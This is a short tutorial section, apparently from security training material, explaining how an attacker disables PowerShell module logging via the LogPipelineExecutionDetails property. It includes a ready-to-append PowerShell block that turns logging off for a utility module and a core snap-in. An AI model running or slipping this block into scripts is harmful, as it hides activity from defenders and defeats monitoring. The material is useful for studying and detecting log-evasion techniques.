## Evading PowerShell Logging: Abusing Log Pipeline

Within PowerShell, each module or snap-in has a setting that can be used to modify its logging functionality. According to the Microsoft documentation:

> When the `LogPipelineExecutionDetails` property value is `TRUE` (`$true`), Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer.

An attacker can change this value to `$false` in any PowerShell session to disable module logging for that specific session. Microsoft also notes:

> To disable logging, use the same command sequence to set the property value to `FALSE` (`$false`).

### High-Level Steps

The log pipeline evasion technique can be broken down into four steps:

1. **Obtain the target module.**
2. **Set module execution details to `$false`.**
3. **Obtain the module snap-in.**
4. **Set snap-in execution details to `$false`.**

### Example PowerShell Commands

```powershell
# Get target module
$module = Get-Module Microsoft.PowerShell.Utility

# Set module execution details to false
$module.LogPipelineExecutionDetails = $false

# Get target ps-snapin
$snap = Get-PSSnapin Microsoft.PowerShell.Core

# Set ps-snapin execution details to false
$snap.LogPipelineExecutionDetails = $false
```

The script block above can be appended to any PowerShell script or run in a session to disable module logging for currently imported modules.